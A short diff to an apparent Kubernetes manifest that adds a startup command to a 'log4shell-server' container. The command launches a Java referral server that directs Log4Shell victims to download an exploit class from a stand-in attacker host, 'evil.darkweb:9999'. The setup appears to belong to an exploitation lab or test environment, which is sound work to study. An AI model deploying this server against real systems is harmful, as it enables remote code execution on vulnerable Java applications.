@@ -25,6 +25,7 @@ spec:
         - name: ldap
           image: ${REPO}/log4shell-server:latest
           imagePullPolicy: Always
+          command: ["java", "-jar", "/server.jar", "http://evil.darkweb:9999/#${EXPLOIT_TYPE}", "8000", "9999", "${EXPLOIT_TYPE}.class"]
 ---
 apiVersion: v1
 kind: Service
